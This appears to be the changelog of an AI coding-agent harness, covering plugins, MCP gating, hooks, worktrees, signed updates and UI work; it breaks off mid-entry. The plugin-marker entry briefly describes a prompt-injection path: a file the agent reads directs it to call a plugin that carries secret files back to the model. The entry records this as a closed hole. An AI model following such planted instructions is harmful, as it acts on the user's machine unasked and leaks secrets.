# Changelog

What changed, in behavior terms — not a file-by-file log. The release
procedure, acceptance criteria and rollback live in [`docs/RELEASE.md`](docs/RELEASE.md).

## [Unreleased]

### Fixed

- **SSE cleanup catches half-open connections through the ping probe.** A connection
  that drops silently without sending a TCP FIN (such as a sleeping laptop or proxy drop)
  no longer hangs in the bridge client set or fanout subscriber list forever. The 15s ping
  acts as a probe via write callback error detection and stream destruction checks, TCP
  keepalive is enabled on the socket, and cleanup runs reliably across close, error, and socket events.
- **Concurrent jobs no longer open duplicate chat tabs.** When multiple jobs arrive
  before any browser tab is open, tab acquisition in `background.js` shares a single
  in-flight promise lock (`tabPromise`), ensuring all concurrent jobs run in the same tab
  and preventing conflicting browser sessions. `popup.js` delegates tab opening to the
  background worker to reuse any existing open tab.
- **The desktop window watchdog asks the exact project and bounds silent streams.**
  The watchdog probe passes `{ root: state.root }` to `rpc('status')` to inspect the actual
  active project instead of assuming the default. If the run has completed at the backend
  (`st.running === false`), the window stops immediately. If the stream remains continuously
  silent for over 3 minutes despite the backend answering, the window writes off the stalled
  run honestly instead of spinning indefinitely.
- **IDE extension test suite runs on every `npm test`.** `ide-extension/selftest.mjs` is
  integrated into the suite via `aipass-bridge/test/ide-extension.test.mjs`, ensuring the
  protocol mirror and marker grammar never drift undetected.

### Changed

- **Node 20 is enough to run this.** The floor was Node 22, and it was never a
  technical requirement: the runtime imports `node:*` builtins that all exist
  in Node 20, and the `node:test` features the suite uses — the `lcov`
  reporter, `suite()` — are in 20 as well. So `engines`, the installers,
  `aipass status`, the setup doctor, the README badge, the deploy image and
  the docs all say 20 now, and CI runs the floor beside the maintained LTS
  lines. The packaged desktop is unaffected either way: it ships its own Node
  as the sidecar, so the machine that installs it needs none.
- **The backend stops asking the bridge a question that cannot be answered.**
  The check that decided whether a bridge was already running asked the
  bridge's **root** path — a path behind the bearer gate, so the answer was
  always 401 and always read as "no bridge". Every backend therefore started a
  bridge of its own: a second process fighting for the port, holding
  `<home>/logs/bridge.log` open, and a log file nothing could delete while
  that process lived. The check asks `/status`, the one route that needs no
  token.
- **The window's plugin list is the truth even in its first second.** The
  backend loads the installed plugins in the background when it comes up, and
  a window that asked for the list in that window was told "no plugins" and
  painted an empty list for the life of the window. The listing now waits for
  the load that is already on its way.
- **A provider's catalog deadline holds the loop it waits on.** The deadline
  was Node's own timeout signal, whose timer does not keep the event loop
  alive: a process whose only pending work was the catalog fetch ended with an
  unsettled promise (exit code 13) instead of the message that names the
  provider that stayed silent. The deadline is now a timer the process holds,
  and it is cleared when the fetch answers.
- **The window is a set of modules, not one file.** `desktop/ui/app.js` was
  four thousand lines holding the transport, the transcript, the panels, the
  settings sheet, the commands and the theme. It is now the entry: the shared
  context and the wiring. The parts are `ui/rpc.js` (the backend client),
  `ui/state.js` (what the window remembers), `ui/transcript.js` (the
  conversation), `ui/settings.js` (the sheet), `ui/commands.js` (the slash
  palette and its handlers) and `ui/panels/` (the files and the sessions
  rail). Nothing changed for the person using the app; what changed is that a
  change in one part no longer has to be read against the whole page.
- **The settings sheet is one page per tab, and each page saves its own
  fields.** The sheet was one function of nine hundred lines with every
  category's code inside it and one validation block at the bottom. Each tab
  now renders its own page and answers for itself: what it would write, and
  what is wrong with what was typed. A tab that has nothing to write says so,
  and the sheet asks all of them before it writes anything.
- **The backend's methods live in one module per domain.** The window's
  backend was a single file with a `methods` object that held the provider
  registry, the project switch, the attachments, the plugins, the update
  service, the file index and the session — all in one closure. They are now
  `aipass-bridge/harness/rpc/{core,settings,session,files,plugins,update}.mjs`,
  sharing one context, and the contract between the window and the backend
  reads all of them.
- **The run's own state is one object, and the stages of a run are modules.**
  The loop was one function of more than a thousand lines: the send pipeline,
  the DONE gates and the budgets shared a handful of variables that existed
  nowhere else. They live in `aipass-bridge/harness/run/` now — the state in
  `RunContext`, the stages in `send.mjs`, `gates.mjs` and `budgets.mjs` — so
  the policy of a stage can be read, and pinned, without a run around it.

### Added

- **The person's own commands, at the moments that matter.** A hook is a
  command line the person wrote, run by the harness at a named moment: after a
  run stages a change (`afterWrite`), before the model's own git commit
  (`beforeCommit`), and when the run ends (`done`). The command's verdict
  comes back — to the model after a change, to the person as a note at the end
  — so "run the linter after every edit" is a setting, not a habit. A hook
  that fails is REPORTED and the run continues; a failing `beforeCommit` hook
  refuses the commit, because a check that only reported itself would let the
  commit it was meant to stop happen. A hook is the person's command, so it
  is not put to the model for permission — but its output is screened for
  secrets and it may not read a secret file.
  (`harness/hooks.mjs`, `test/hooks.test.mjs`)
- **The model can ask what this project said before.** A new `RECALL` marker
  searches the project's own sessions — a plain word match over the newest
  ones, with the newest first and a cap on what comes back. It is a search
  over what was already said, not a summary and not a guess, and it says how
  many sessions it looked at. The question rides the secret floor like any
  other read.
  (`harness/memory-store.mjs`, `harness/protocol.mjs`, `test/recall.test.mjs`)
- **A run can work in its own checkout.** Two runs — or a run and the person —
  editing one repository fight over the same files, and the category says so
  out loud. `/worktree` makes a git worktree for the project **outside** it
  (`~/.aipass/run/worktrees/<name>`, the same rule the sandbox projection
  follows: nothing lands inside the person's project), and the window works in
  it from then on: the harness, the overlay and the apply are all confined to
  that folder, so the files the run writes are not the files the person is
  editing. The window names the worktree and its path, shows what changed
  inside each one, can take one away, and sweeps the ones nobody wants (clean,
  older than a fortnight). The merge is the person's: the window names the
  branch and the path.
  (`harness/worktree.mjs`, `test/worktree.test.mjs`)
- **The archive has a way back.** "เก็บ" (archive) moves an idle session out
  of the picker's way into `<project>/archive/` — nothing was deleted, but
  nothing could bring one back either, so the archive was a one-way door. The
  **session rail** now says how many are in there, lists them, and puts any
  of them back where it was; the **CLI** does the same from
  `aipass sessions restore <id>`. Beside it, `aipass sessions prune` (and a
  button in the rail) deletes what has sat in the archive for months — the
  one thing in the store that deletes, deliberately narrow: only the archive,
  only what is past the threshold, only as many as the limit says.
- **`aipass sessions`** — the conversations this project keeps on disk, from
  the terminal: `list`, `archived`, `archive`, `restore`, `prune`, `path`. No
  bridge needed; the store is local.

- **The window says it is working.** A run takes minutes — a model that reads
  twenty files does not answer in a second — and the window used to say so
  once: a pulsing dot under the composer, and then nothing for the rest of
  the run. There is now a **bar over the foot of the transcript**: bouncing
  dots and a clock that counts the seconds, on screen however far up the
  reader has scrolled, and gone the moment the run ends. A stop, an update
  that reloads the window, and a window that came back to a run still in
  flight all say what they are waiting for.
- **A reloaded window comes back with its conversation.** Ctrl+R is still a
  reload — a wedged page needs its escape hatch — but what came back used to
  be the welcome card over an empty screen: the boot paints that card, and
  the card said "there is nothing here" over a run that was still going. The
  card is the note for an *empty* window now: a reloaded window restores the
  conversation it left, and the welcome card never comes back over it.
- **The model list heals itself, and says what it is.** The catalog is fetched
  by the Chrome extension, in the page, from the site — so a window that could
  not reach a tab used to show a two-model stub with no explanation, and the
  only way to get the real list was to reload the whole window. The bridge now
  publishes what the catalog **is** (`/status` → `catalog`: the source, the
  stamp of the last change, and the last failure) and retries its own stub
  while an extension is attached. The window rebuilds the dropdown when that
  stamp moves, names the list it is showing when that list is not the site's,
  and a failed refresh no longer takes the list away. A **refresh button**
  beside the model asks for a fresh catalog, and **Ctrl+R inside the model
  picker** refreshes it where it stands.
- **The desktop shell's own tests run in CI now.** The Rust side of the app —
  the tray, the sidecar, the settings migration, the PATH handling — had
  fourteen unit tests that nothing ever asked for, so a broken one merged
  green. A CI lane runs `cargo test` for them on both platforms (half of
  those tests only exist on one side), and the lint runs beside them without
  being a gate. The window's contract with the backend is checked there too:
  every RPC method the window calls has to exist on the backend, which is the
  one thing a page with no types cannot catch for itself.
- **A floor under the coverage of the code the window runs.** A file whose
  coverage fell through the floor is a file nobody is testing any more, and
  the suite stays green while that happens. The gate measures the whole
  suite — every test file with its own report, merged — and the floors are
  the numbers the suite measures today (`npm run coverage:gate`).
- **The desktop launcher's rules are in one file now, and they are tested.**
  The launcher decides which backend the window talks to, and it was the one
  file no test could touch: an entry script runs its top level on import.
  The rules moved to `aipass-bridge/harness/launcher.mjs`, so the port rule,
  the project rule, the bridge probe, the spawn, the adoption and the busy
  port are all covered by the suite
  (`aipass-bridge/test/launcher.test.mjs`).

- **The rail tells you what is where, and lets you arrange it.**
  The sidebar was two fixed lists: the history and the folder you are in. The
  **file panel** is a tree you can walk now. A **trail** under the heading
  walks back to any folder above the one you are in, and the **field** under
  it searches the **whole project** — a folder with a hundred files is a list
  nobody scrolls, and a project with a thousand is a tree nobody can walk in
  their head; each result says which folder it lives in, and the keyboard
  opens it (Enter) or walks into the list (↓). Every row carries the **type
  of the file** (a folder, code, an image, a document) and its **size**, the
  heading says how many there are, and a button reads the folder again — the
  list is a picture of the disk, and a picture goes stale while you work. A
  folder that cannot be read **says so** and offers to read it again, instead
  of looking like an empty one. The **history is grouped by day** — today,
  this week, this month — so 99 conversations are a few questions and not a
  wall of clocks, and a session somebody **named** shows its name (the clock
  face was the name of every session that had none). The **rail folds**: the
  history and the file list each have a chevron, the reader decides which one
  gets the 264 pixels, and the window remembers the answer. The rows answer
  the **arrow keys** too, and show where the keyboard is
  (`desktop/ui/index.html`, `desktop/ui/app.js`, `desktop/ui/styles.css`,
  `aipass-bridge/harness/rpc.mjs`).
- **Finding a file is a filter, not a walk.** The backend keeps an index of
  the project's paths for a minute and answers `fs.search` from it, so the
  search keeps up with the keyboard; the index is built by the same rules
  the tools walk by — the skipped folders, `.gitignore`, the secret files,
  and the links that point out of the project — and it is dropped when the
  tree changes (`aipass-bridge/harness/rpc.mjs`).
- **The search finds the file you meant, and the line inside it.**
  The quick-open of the window is a **fuzzy** one now: "apjs" finds
  `desktop/ui/app.js`, "app" ranks `app.js` above `apply.mjs`, and the letters
  that matched are **picked out in the result** — the reader sees why the row
  is in the list, not only that it is. The rules live in one module
  (`harness/fuzzy.mjs`): the file name beats a folder name, the start of a
  word beats the middle of one, a run of letters beats the same letters
  scattered. The match is a small **dynamic program**, not a walk: every
  position of the text is tried against every letter of the word, and the
  best path wins — so in "xa_ab" the word "ab" fits the "a" that begins a
  word, not the one buried inside "xa", which is the one a greedy matcher
  takes and never looks past. The same field has a **second mode**: the
  button at its end, or **Ctrl+Shift+F**, searches **inside** the files — the
  answer is the line, where the word was found, and one click opens the file
  **on that line**. The lines of the files are **kept for a minute**, so the
  second search is a filter over memory instead of a walk over the disk
  (`aipass-bridge/harness/fuzzy.mjs`, `aipass-bridge/harness/rpc.mjs`
  (`fs.search`, `fs.grep`), `desktop/ui/{index.html,app.js,styles.css}`).
- **The app can update its own code now — the parts that are not the binary.**
  The window checks a **signed** release feed: the signature is verified
  against a public key that is compiled into the app, so a compromised
  release host cannot hand the app something to run, and an old feed
  replayed at you is refused. When the feed names a newer content tree — the
  harness, the bridge and the window's own files — the app shows it as a
  banner with one button; the click is the consent, nothing is applied while
  a run is in flight, and the pack is checked against the hash inside that
  signed feed before a single file is written. The new tree is promoted
  atomically and the previous one is kept, so a rollback is a click and not a
  reinstall. The **binary is not touched**: the shell still waits for a
  person and the installer, and both version numbers are on screen — the
  binary's and the content's — so "which build am I running" still has an
  answer. `/update` in the window shows the state
  (`docs/UPDATE_DESIGN.md`).
- **The shell can be handed over to the installer — and the gate is closed.**
  The window now offers the new *installer* as well as the new content: the
  click asks the backend to fetch the installer, check it against the signed
  feed, and leave a command; the shell reads the command, hashes the
  installer again with the app's own Node, starts the handover (the app
  closes, the installer runs, the app comes back) and refuses anything whose
  hash is not the one it was handed. **It refuses to run an unsigned
  installer**, and the Windows installer is unsigned today, so the path
  cannot run yet — the gate is the signed feed's own word about the
  artifact, so only the release key opens it. The button says that the app
  will close, and a refusal is said on screen instead of the app vanishing.
- **The links a web search brings back are links again.**
  A search answers with prose and a `sources:` block, and until now that block
  held addresses nobody could use: the search edge answers with opaque
  redirect links (a long token on a search host), and what reached the screen
  was the wire spelling (`HTTPS-URL…`) — a reader could neither click the
  address nor copy it. Now the redirects are followed once, under the same
  private-host guard the FETCH tool uses, and the block is rewritten to the
  article's own address; the window puts the wire spellings back before it
  shows anything, so what is on screen is the address itself; the sources
  travel with the tool row and are listed under it, each one a link the reader
  can open (the click goes to the backend, which opens it in the browser, not
  in the window); and the model is told to carry the sources into its answer
  as links, so a claim can be checked
  (`aipass-bridge/harness/web-sources.mjs`, `desktop/ui/waf-restore.js`).
- **The harness can tune itself, one component at a time.**
  `npm run meta` is a loop over the harness: it writes a brief that quotes the
  harness's own source and the RAW transcript lines of past runs, records a
  candidate change to one of six components, measures that candidate against
  the baseline with the same matrix and the same gates the evals use
  (regression, safety, spend, sample floor), and rolls the change back when
  the score does not move. The editable half of a component is a plain
  document in `~/.aipass/harness/policy/`; the runtime composes the enabled
  ones into the first message of a conversation, additively and within a byte
  budget, so with no document on disk the preamble is byte-identical to what
  it was. A candidate is checked deterministically before it is measured: one
  that weakens the permission/secret/verification floor, or that carries a
  token the outbound WAF table rewrites, is refused rather than scored
  (`docs/META_HARNESS.md`, `aipass-bridge/harness/meta/`,
  `scripts/meta-optimize.mjs`).
- **The upgrade and rollback are a script now.**
  `npm run desktop:install-ladder` installs the artifact, checks that the
  installed build is the one that shipped and that it actually runs (its
  backend answers), installs the new build over the old one and checks it
  again, installs the old build back and checks it again, uninstalls — and
  checks that the user's data is still there. Give it both artifacts and it
  walks the whole ladder. It installs software on the machine it runs on, so
  it asks first, and it never touches the real `~/.aipass`: the app runs
  with `AIPASS_HOME` pointing at a scratch directory
  (`scripts/install-ladder.mjs`, `test/install-system.test.mjs`).
- **The window can put the CLI on PATH.** The tray menu gained
  "ติดตั้ง CLI (aipass)": it writes a shim into a per-user bin directory
  (`~/.local/bin/aipass`, or `%LOCALAPPDATA%\aipass\bin\aipass.cmd`) that
  runs the app's own Node against the app's own CLI — so a machine without
  Node still gets a working `aipass`. Nothing is written until somebody
  clicks; the window says where the shim went
  (`desktop/src-tauri/src/main.rs`).
- **A universal macOS build has a sidecar to go with it.**
  `npm run desktop:sidecar:universal` merges the two official Node builds
  for the running Node's version with `lipo` — a macOS job, because `lipo`
  is one — into the `node-universal-apple-darwin` the bundler expects, and
  signs it when an `APPLE_SIGNING_IDENTITY` is configured
  (`scripts/build-universal-sidecar.mjs`).
- **CI builds the artifact on all three platforms.**
  `.github/workflows/build.yml` runs the one build command on Windows, macOS
  and Linux and uploads the artifact with its checksum and its manifest. The
  macOS lane is the reason a Mac is needed in CI at all: the bundler needs
  `hdiutil`, `codesign` and the macOS SDK
  (`.github/workflows/build.yml`).
- **The desktop has one build command that ships.** `npm run desktop:build`
  checks that `package.json`, `Cargo.toml` and `tauri.conf.json` name the
  same version (an artifact whose name says 0.2.0 and ships 0.2.1 is a
  rollback nobody can reason about), puts the Node sidecar in place for the
  triple being built, asks the bundler for the platform's bundles — NSIS on
  Windows, `.app` + `.dmg` on macOS, `deb` + AppImage on Linux — and writes
  the artifact to `dist/` as
  `aipass-desktop-<version>-<platform>-<arch>.<ext>`, beside a `SHA256SUMS`
  file and a `manifest.json` that says which commit it was built from and
  whether it was signed. The shape of the whole install system — what an
  install guarantees, what each platform does, what macOS needs and what is
  still missing — is `docs/INSTALL.md`
  (`scripts/build-desktop.mjs`, `test/install-system.test.mjs`).

- **A projection whose backend died is collected in minutes, not in six
  hours.** The janitor that collects the copies a killed backend left behind
  knew only one thing — how old a projection was — so a crash cost six hours
  of disk, and a long-lived backend (the window) swept only at its first
  boot. Each projection now carries a stamp beside it naming the process that
  made it, and the janitor reads it: a projection whose owner is gone waits
  out minutes, a projection a live run still owns keeps the six-hour margin
  a run's budget needs. The sweep runs before every run, not only at the
  first one, and it deletes asynchronously — a tree of the user's project
  removed on the backend's event loop would freeze the window
  (`harness/sandbox.mjs`, `harness/harness.mjs`, `harness/tools.mjs`,
  `test/sandbox.test.mjs`).
- **A staged JSON edit is checked too.** The edit diagnostics that run
  `node --check` on a staged JavaScript file now parse a staged `.json` file
  in-process: `JSON.parse` needs no process and no toolchain, and a
  `package.json` with a missing comma breaks every tool in the project the
  moment it lands. The verdict rides the tool result like the JavaScript one,
  and names the line and the column, so the fix is a place and not a hunt. A
  `tsconfig*.json` and a `*.jsonc` are read the way their own reader reads
  them — comments and trailing commas allowed — and every other `.json` is
  read as JSON, strictly (`harness/tools.mjs`, `test/harness-research.test.mjs`).
- **A run that goes round a longer circle is caught.** The stagnation guard
  stopped a run that repeated itself and a run whose two steps traded places;
  a three-state round — read file A, edit file B, run the test, read file A
  again — looked like progress and went nowhere. The guard now reads the
  window of recent step signatures and recognises a round of three states or
  more, counting laps rather than detections, and the evidence side rides
  with it: a run whose answers keep coming back the same is stopped on the
  first strike instead of being handed a correction it has already shown it
  does not act on (`harness/loop.mjs`, `test/harness-research.test.mjs`,
  `docs/LOOP_DESIGN.md`).
- **A plugin marker rides the permission gate like a built-in.** A marker the
  model asks for used to run whenever it asked: only a marker that *declared*
  a `risk` at registration was ever put to the person, and an undeclared one
  was trusted by silence. That is the wrong way round — a plugin's code runs
  in the backend process with the app's rights, so a marker the model asked
  for by accident, or one a file it read told it to, could act on the machine
  unasked. Now every marker is classified: the declared risk is taken as
  given, and an undeclared marker is classified like a **write**. The
  person's own path rules and the secret floor reach a marker through its
  argument, and the payload the argument does not carry — the body — is
  screened for secret names too, because a plugin used as a proxy would carry
  the file straight back to the model and the plugin's own code cannot be
  screened from the harness. The window's question says what it is: a
  marker, and what it was handed (`harness/permissions.mjs`,
  `harness/loop.mjs`, `harness/plugins.mjs`, `desktop/ui/app.js`,
  `test/gates.test.mjs`, `test/permissions.test.mjs`).
- **A plugin can be installed from a repository or a package.** The install box
  and `aipass plugin install` now take `github:owner/repo#ref`,
  `git+https://…`/`git+ssh://…` and `npm:<package>` beside a path and an
  `https://` URL. Fetching is not running: git is cloned shallow and npm is
  installed with `--ignore-scripts`, so no package script runs before the
  person says yes, and the hash of the entry file is checked again at install
  time — a branch that moved since the report is refused. The registry records
  the spec, so `aipass plugin update` re-fetches it
  (`harness/install.mjs`, `test/install.test.mjs`).
- **A refused install says which step closed the door.** The installer tags
  each failure with the step it happened in (plan, fetch, validate, name,
  swap, finalize), the RPC carries it, and the window shows it next to the
  error — so a box that says "err" now says *what* failed, and the install box
  says what it is doing while it works
  (`harness/install.mjs`, `harness/rpc.mjs`, `harness/desktop-rpc.mjs`,
  `desktop/ui/app.js`, `test/ui.test.mjs`).
- **The desktop can talk to another provider.** The window now has a provider
  switch next to the model picker: AiPASS (the local bridge and its tab) stays
  the default, and an OpenAI-compatible or Anthropic endpoint can be added
  beside it. The specs live in `~/.aipass/providers.json` and the keys in
  `~/.aipass/credentials.json` (owner-only) or an environment variable — never
  in `settings.json`. The switch is machine-wide, so the terminal sees it too:
  `aipass providers list|add|remove|use|test`, and `agent.mjs --provider <id>`
  for one run. A provider is a swap, not a second loop — it answers the same
  client contract as the bridge, keeps the conversation history the AiPASS
  edge would have kept, and gets the bytes as they are: the WAF table is that
  edge's own, so another provider's text is never encoded for a firewall that
  is not there
  (`harness/providers.mjs`, `harness/provider-client.mjs`, `providers.mjs`,
  `test/providers.test.mjs`).
- **DONE can be held to the check.** `verifyCommand` names the one command a
  run's checker must treat as the declared check, so a verdict is comparable
  even before a project commits `.aipass/check.txt`; `requireCheck` makes a
  later DONE over a still-failing declared check terminal as
  `done-unverified` instead of accepting it. The default stays advisory, the
  first failure still earns its correction, and `run_stats` now records
  `checkCommand` and `doneUnverified` beside `checks`/`checkVerdict`
  (`harness/loop.mjs`, `harness/harness.mjs`, `test/checker.test.mjs`).
- **One shape check before every dispatch.** Built-in tools, plugins and MCP
  tools now pass through `validateCall()` first, so an empty `RUN`, a blank
  `NEED`/`SEARCH` or an uninstalled marker answers with the same `err: …`
  sentence instead of reaching an implementation that may throw
  (`harness/validate.mjs`, `test/validate.test.mjs`).
- **The desktop starts oriented.** Window-created harnesses turn the bootstrap
  snapshot on by default — git state and package scripts in turn 1 — while the
  CLI keeps `--snapshot` opt-in so its tuned bytes stay identical
  (`harness/rpc.mjs`, `test/desktop.test.mjs`).
- **Sends are paced before the edge refuses them.** `BridgeClient` carries a
  token bucket shared by the run, its helpers and the checker: four initial
  sends and one every 45 seconds, so a parallel burst waits briefly instead of
  drawing a 429 and then a long retry. `AIPASS_RATE_BUCKET` overrides it
  (`off` for the suite), and the tests pin the meter with an injected clock
  (`harness/bridge.mjs`, `test/rate-bucket.test.mjs`).
- **`aipass relocate` — moving a project (or a whole machine) keeps its
  history.** Sessions, cross-session memory, path rules and the project list
  are all keyed by a project's absolute path, so a home folder copied to a
  machine where the project lives somewhere new kept every byte and lost every
  connection: an empty picker, no facts, no rules. `harness/relocate.mjs`
  re-keys all four onto the new path — merging into whatever already lives
  there — and `aipass relocate <old> <new>` drives it, refusing while the
  desktop app is running (open sessions and the old paths live in its
  memory). The old folder does not need to exist anymore; the new one must.
  The restore drill now walks the cross-machine case end to end
  (`test/data-flow.test.mjs`, `test/restore-drill.test.mjs`).
- **Plugins install like software now.** `aipass plugin
  list|inspect|install|remove|enable|disable` and the settings sheet's
  ปลั๊กอิน section: inspect prints size + sha256 and executes nothing, install
  stages, validates with the real loader, then swaps — the previous version
  moves to `.trash/` and is never deleted, and a failed update leaves the old
  version live with the reason (`harness/install.mjs`,
  `test/install.test.mjs`). `.registry.json` records provenance (advisory —
  deleting it never blocks loading), an unmanaged file or folder needs an
  explicit `--force` to be replaced or removed, and the enabled-list rules are
  precise: the first ปิด materializes the list, disabling the last name writes
  the sentinel `(none)` so `[]` cannot read as "everything", and enabling
  collapses back only when every *known* name is covered
  (`test/plugins.test.mjs`). The window gained an install box (inspect →
  hash report → ติดตั้ง) and per-card เปิด/ปิด/ลบ
  (`test/desktop-window.test.mjs`, `test/ui.test.mjs`).
- **MCP servers got a lifecycle — and a gate.** `mcp.json` entries gain
  `enabled`, `risk` (default `"write"`) and `cwd`; `mcp.list` answers a status
  row per server (connected / error / disabled, tool count, risk);
  `mcp.add|remove|enable|disable|reload|test` exist over RPC, `aipass mcp
  add|test|enable|disable|remove` over the CLI, and the settings sheet grew a
  🔌 MCP section with per-row state and an add form matching the CLI's flags
  (`harness/mcp.mjs`, `test/mcp.test.mjs`). The hole it closes: MCP tools ran
  **ungated** — `risk: null` through `classify('plugin')` is `'read'`, i.e.
  pre-answered yes in every mode; a server's declared risk now reaches the
  same verdict a built-in would. `[ทดสอบ]` runs a command once and lists its
  tools before saving, env values mask after save and are never logged, and a
  bad command is a listed row with its error instead of a crash.
- **The CLIs talk to a running window.** `aipass plugin`/`aipass mcp` mutate
  through the live desktop backend when one is listening
  (`harness/desktop-rpc.mjs`) — a backend refusal is final — and edit the same
  files directly when none is, so an open sheet updates live and a stopped
  backend reads the change at its next start.
- **`aipass plugin update <name>` — and a trash that stays small.** Update
  re-reads the source recorded at install time (a path picks up edits in
  place), refuses a name the installer did not install — nothing was recorded
  to re-fetch — and repeats the whole install chain: inspect, hash, consent,
  stage, validate, swap. The enable state is left exactly where the person put
  it. Each swap keeps one previous copy per name in `.trash/`, pruning the
  generation before it, so repeated updates do not accumulate full copies of
  the folder (`harness/install.mjs`, `test/install.test.mjs`).
- **`aipass doctor` reads the local extension channels.** Two checks added:
  plugins that failed to load, named with `aipass plugin list` as the fix, and
  MCP servers — live rows when a desktop backend is running, or, without one,
  the enabled-config count marked "not tested" rather than silently skipped
  (`aipass-bridge/doctor.mjs`, `test/doctor.test.mjs`).
- **Session archive.** Projects that lived for months carried dozens of dead
  sessions in the picker (61 files in one project on this machine). Past 40
  sessions the picker shows a one-click archive: `session.archive` moves
  sessions idle 30+ days to `<project>/archive/` — nothing deleted, the live
  session always kept (`test/data-integrity.test.mjs`).
- **Health page in Settings.** The `🩺 สุขภาพ` section shows bridge /
  extension / tab / credits / build with the fix for whatever is red — the
  same answers as `aipass doctor`, without opening a terminal
  (`test/ui.test.mjs`).
- **Build version in the window.** `status()` carries `app` (the build that
  wrote the backend), shown in `/status` and the health page — a stale
  install reads as a version instead of a mystery.
- **An applied change can be taken back.** The only way back from an apply
  used to be `git restore` by hand — and the person who never asked for git
  had none. Before an apply writes, the files it is about to change are
  snapshotted into `~/.aipass/run/checkpoints/<projectKey>/`, outside the
  project, and the answer to the apply carries the checkpoint's id
  (`checkpoints.list`, `checkpoints.restore`, `checkpoints.remove` over the
  RPC). A restore puts the old bytes back — the same bytes, not a
  re-encoding: a BOM, CRLF and Thai survive the round trip — and a file
  that did not exist before the apply is removed again. What it is NOT: a
  general undo. It undoes one apply, and only the files that apply touched;
  anything a run changed outside an apply is not in the store. Twenty
  checkpoints are kept per project, and the oldest go. The window lists them
  (the pending panel, and `/checkpoints` for the whole list) and has the
  button that puts the old bytes back
  (`harness/checkpoints.mjs`, `test/checkpoints.test.mjs`).
- **`GIT` can write — when you give it the power.** `stage`, `commit` and
  `branch` exist now, and they are OFF until the run was given
  `allowGitWrite` (a settings key, off by default, so a run never rewrites
  the repository's history on its own; the CLI's `--allow-git-write` is the
  same consent from a terminal, and `--allow-verify` is for the marker
  below). A git write is classified as a
  WRITE, so `ask` mode asks before it runs — the same gate every write
  rides. The wrapper uses argv arrays and never a shell string, refuses a
  path that leaves the project (lexically and through a symlink), and a
  commit refuses an empty message or an empty index. The window has
  `git.status|stage|commit|branch` as the human's own buttons — they live on
  the sheet's **git** page, act on the project and report what changed, and
  they do not consult the model's permission mode, because a person clicking
  a button is the consent
  (`harness/git.mjs`, `test/git.test.mjs`).
- **The model can ask for a check.** A new `VERIFY` marker lets the model
  ask for a check mid-run, instead of waiting for the DONE gate to run one
  on its own. The declared check runs first — the run's `verifyCommand`, or
  the project's `.aipass/check.txt` — and the checker (the read-only child
  that runs the project's own checks) is the fallback. The result comes back
  as an ordinary tool result, so the model reads what the command said. It
  is a shell call, so it rides the shell gate — and it needs the shell to be
  on at all — and it is off by default
  (`allowVerify`): the preamble that teaches the marker is behind the same
  switch, so a run that cannot use it is never told about it
  (`harness/protocol.mjs`, `harness/tools.mjs`, `harness/loop.mjs`,
  `test/verify-marker.test.mjs`).
- **The account does more than chat, and the harness can reach it.** The
  live catalog carries image, video and music models, and the service
  publishes presets for them (tones, formats, image styles, video styles).
  The harness can list the media models with the options each one accepts,
  resolve a preset by its English name, its Thai name, its code or its id,
  run a generation, and KEEP the file — under `~/.aipass/media/` by
  default, outside the project, because a render must not land in a
  repository by accident. An option the model does not declare is dropped
  BEFORE the request: the upstream takes a value it will not use and
  refuses it later, once the credits are gone. A generation waits for the
  media timeout, not the idle one — a render sits quiet for minutes, and the
  idle clock killed images that had already spent the credits. The window's
  sheet has the page that makes one: only the options the chosen model
  accepts are on screen, and the answer names the file it wrote and the
  options it dropped
  (`harness/media.mjs`, `harness/rpc/media.mjs`, `test/media.test.mjs`).
- **A session can be kept, and the history can be browsed.** A session
  exports as markdown or as one self-contained HTML page — no script, no
  external asset, everything escaped, because a transcript holds the model's
  own words and words can carry markup. Nothing is dropped: an entry type a
  newer build wrote is still in the file, so it is still in the export, with
  its type named. The project's sessions can also be browsed as a tree
  grouped by day — the same grouping the window's history rail uses, as
  data. The window has both: `/export` keeps the open session as markdown
  or HTML, `/tree` opens the sessions by day
  (`session.export`, `session.tree`; `harness/export.mjs`,
  `test/export.test.mjs`).
- **Work can be scheduled for a time of day.** A task is a local time
  (`HH:MM`), a project folder and something to do; it lives in
  `~/.aipass/schedule.json` (owner-only) and runs through the CLI, so a
  scheduled run is a run like any other. A due entry runs once and is then
  spent; a disabled entry never runs. The limits are honest ones: the
  backend ticks nothing by itself — the window asks it to run what is due —
  and a scheduled run needs the bridge and a logged-in tab like any other
  run. The window's sheet has the page that adds one: what to do, at what
  local time, every day or once
  (`schedule.list|add|remove|runDue`; `harness/schedule.mjs`,
  `test/schedule.test.mjs`).
- **An editor surface.** `ide-extension/` is a VS Code extension that drives
  the SAME local backend contract the window uses (`POST /rpc` and
  `GET /events`, behind the loopback token). It does not talk to the
  bridge's OpenAI-compatible endpoint, and cannot: that endpoint refuses
  an agent-style system prompt and owns the conversation server-side, which
  is why the harness sends its markers as user messages. The panel runs a
  task, streams the run, answers the permission and plan questions, shows
  the staged changes, stops the run and shows the credit meter. It is a
  client, not a second app: it never starts the agent, and the settings
  sheet, the plugin installer and the update service stay in the window
  (`ide-extension/README.md`, `ide-extension/protocol.md`).
- **An empty credit pool names itself.** The welcome card gains a fourth
  readiness row (credits available/limit) only when the quota is known: 0
  reads as "รอรอบถัดไป หรือใช้โมเดล free-credit" instead of a blank window,
  and quota errors map to the same Thai copy (`test/ui.test.mjs`).
- **Packaged resources are pinned by test.** A new CLI at
  `aipass-bridge/*.mjs` that nobody adds to `tauri.conf.json` used to ship a
  window whose command is missing — a test now fails until it is listed
  (`test/desktop.test.mjs`). The five missing CLIs (`mcp`, `memory`,
  `plugin`, `scale`, `setup`) are added.
- **The paint cache reports itself.** The window's streaming paint cache — a
  frame appends to the settled layer; only a rewrite (a plugin table landing
  late and hiding a marker line) resets it — now counts hits, misses, cold
  frames and the characters each side painted, and `/paint` prints them: "long
  answers feel slow" answers with a number instead of a shrug
  (`test/ui.test.mjs`).
- **The bridge's caches report themselves.** `/status` carries `cache` —  
  model-list, credit and conversation hits vs upstream fetches — and the
  window's `/status` prints the line when the backend offers it
  (`test/bridge.test.mjs`).
- **Tables, images and videos render in the window.** The markdown renderer
  only knew paragraphs, lists and code, so a table arrived as a wall of pipes
  and `![...]` stayed literal. Pipe tables now render with per-column
  alignment, a standalone image becomes a captioned figure, and a standalone
  video URL (or `![caption](clip.mp4)` / `[caption](clip.mp4)`) becomes a
  player. Media is limited to http(s) — never `javascript:` or `data:` — and
  the streaming split keeps a table (or a pipe line that might become one) in
  the repainting tail, so a settled paragraph is never rewritten into a table
  mid-stream (`test/ui-md.test.mjs`).

### Fixed

- **A Ctrl+C no longer rolls the content back.** The backend used to inherit
